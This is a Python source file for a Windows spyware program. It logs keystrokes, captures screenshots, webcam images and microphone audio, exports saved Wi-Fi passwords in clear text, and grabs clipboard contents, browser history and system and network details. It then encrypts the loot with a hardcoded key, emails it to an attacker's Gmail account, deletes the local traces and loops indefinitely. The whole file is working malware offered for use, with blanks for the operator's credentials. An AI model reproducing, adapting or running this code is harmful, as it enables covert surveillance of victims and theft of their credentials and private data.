import subprocess, socket, win32clipboard, os, re, smtplib, \
        logging, pathlib, json, time, cv2, sounddevice, shutil
from requests import get
import browserhistory as bh
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Keystroke Capture Funtion #
def logg_keys(file_path):
    logging.basicConfig(filename = (file_path + 'key_logs.txt'), 
        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    on_press = lambda Key : logging.info(str(Key))
    with Listener(on_press=on_press) as listener:
        listener.join()

# Screenshot Capture Function #
def screenshot(file_path):
    pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
    screen_path = file_path + 'Screenshots\\'

    for x in range(0,60):
        pic = ImageGrab.grab()
        pic.save(screen_path + 'screenshot{}.png'.format(x))
        time.sleep(5)

# Mic Recording Function #
def microphone(file_path):
    for x in range(0, 5):
        fs = 44100
        seconds = 60
        myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()
        write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)

# Webcam Snapshot Function #
def webcam(file_path):
    pathlib.Path('C:/Users/Public/Logs/WebcamPics').mkdir(parents=True, exist_ok=True)
    cam_path = file_path + 'WebcamPics\\'
    cam = cv2.VideoCapture(0)

    for x in range(0, 60):
        ret, img = cam.read()
        file = (cam_path  + '{}.jpg'.format(x))
        cv2.imwrite(file, img)
        time.sleep(5)

    cam.release
    cv2.destroyAllWindows

# Email sending function #
def send_email(path): 
    regex = re.compile(r'.+\.xml$')
    regex2 = re.compile(r'.+\.txt$')
    regex3 = re.compile(r'.+\.png$')
    regex4 = re.compile(r'.+\.jpg$')
    regex5 = re.compile(r'.+\.wav$')

    email_address = ''                      #<--- Enter your email address
    password = ''                           #<--- Enter email password here

    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] =  email_address
    msg['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    msg.attach(MIMEText(body, 'plain'))
    exclude = set(['Screenshots', 'WebcamPics'])

    for dirpath, dirnames, filenames in os.walk(path, topdown=True):
        dirnames[:] = [d for d in dirnames if d not in exclude]
        for file in filenames:
            if regex.match(file) or regex2.match(file) \
                or regex3.match(file) or regex4.match(file):

                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 
                                'filename = {}'.format(file))
                msg.attach(p)

            elif regex5.match(file):
                msg_alt = MIMEMultipart()
                msg_alt['From'] = email_address
                msg_alt['To'] = email_address
                msg_alt['Subject'] = 'Success'
                msg_alt.attach(MIMEText(body, 'plain'))

                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 
                                'filename = {}'.format(file))
                msg_alt.attach(p)

                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.starttls()
                s.login(email_address, password)
                s.sendmail(email_address, email_address, msg_alt.as_string())
                s.quit()

            else:
                pass

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, email_address, msg.as_string())
    s.quit()

def main():
    pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
    file_path = 'C:\\Users\\Public\\Logs\\'

##### Retrieve Network/Wifi informaton for the network_wifi file ################################################################
    network_wifi = open(file_path + 'network_wifi.txt', 'a')
    try:
        commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', 
                                    'folder=C:\\Users\\Public\\Logs\\', 'key=clear', 
                                    '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 
                                    'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a'], 
                                    stdout=network_wifi, stderr=network_wifi, shell=True)
        outs, errs = commands.communicate(timeout=60)

    except subprocess.TimeoutExpired:
        commands.kill()
        out, errs = commands.communicate()

    network_wifi.close()

##### Retrieve system information for the system_info file ######################################################################
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    system_info = open(file_path + 'system_info.txt', 'a')
    public_ip = get('https://api.ipify.org').text
    system_info.write('Public IP Address: ' + public_ip + '\n' \
                      + 'Private IP Address: ' + IPAddr + '\n')
    try:
        get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], 
                        stdout=system_info, stderr=system_info, shell=True)
        outs, errs = get_sysinfo.communicate(timeout=15)

    except subprocess.TimeoutExpired:
        get_sysinfo.kill()
        outs, errs = get_sysinfo.communicate()

    system_info.close()

##### Copy the clipboard ########################################################################################################
    clipboard_info = open(file_path + 'clipboard_info.txt', 'a')
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        clipboard_info.write('Clipboard Data: \n' + pasted_data)
        clipboard_info.close()
    except:
        clipboard_info.close()
        pass

##### Get the browsing history ##################################################################################################
    browser_txt = open(file_path + 'browser.txt', 'a')
    try:
        browser_history = []
        bh_user = bh.get_username()
        db_path =  bh.get_database_paths()
        hist = bh.get_browserhistory()
        browser_history.extend((bh_user, db_path, hist))
        browser_txt.write(json.dumps(browser_history))
        browser_txt.close()
    except:
        browser_txt.close()
        pass

##### Using multiprocess module to log keystrokes, get screenshots, ############################################################ 
    # record microphone, as well as webcam picures #
    p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()
    p2 = Process(target=screenshot, args=(file_path,)) ; p2.start()
    p3 = Process(target=microphone, args=(file_path,)) ; p3.start()
    p4 = Process(target=webcam, args=(file_path,)) ; p4.start()

    p1.join(timeout=300) ; p2.join(timeout=300) ; p3.join(timeout=300) ; p4.join(timeout=300)

    p1.terminate() ; p2.terminate() ; p3.terminate() ; p4.terminate()

##### Encrypt files #############################################################################################################
    files = [ 'network_wifi.txt', 'system_info.txt', 'clipboard_info.txt', 
            'browser.txt', 'key_logs.txt' ]

    regex = re.compile(r'.+\.xml$')
    dir_path = 'C:\\Users\\Public\\Logs'

    for dirpath, dirnames, filenames in os.walk(dir_path):
        [ files.append(file) for file in filenames if regex.match(file) ]

    # In the python console type: from cryptography.fernet import Fernet ; then run the command
    # below to generate a key. This key needs to be added to the key variable below as
    # well as in the DecryptFile.py that should be kept on the exploiters system. If either
    # is forgotten either encrypting or decrypting process will fail. #
    # Command -> Fernet.generate_key()
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    for file in files:
        plain_text = open(file_path + file, 'rb')
        data = plain_text.read()
        encrypted = Fernet(key).encrypt(data)
        hidden_data = open(file_path + 'e_' + file, 'ab')
        hidden_data.write(encrypted)
        plain_text.close()
        hidden_data.close()
        os.remove(file_path + file)

##### Send encrypted files to email account #####################################################################################
    send_email('C:\\Users\\Public\\Logs')
    send_email('C:\\Users\\Public\\Logs\\Screenshots')
    send_email('C:\\Users\\Public\\Logs\\WebcamPics')

    # Clean Up Files #
    shutil.rmtree('C:\\Users\\Public\\Logs')

    # Loop #
    main()


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, \
                            filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception('* Error Ocurred: {} *'.format(ex))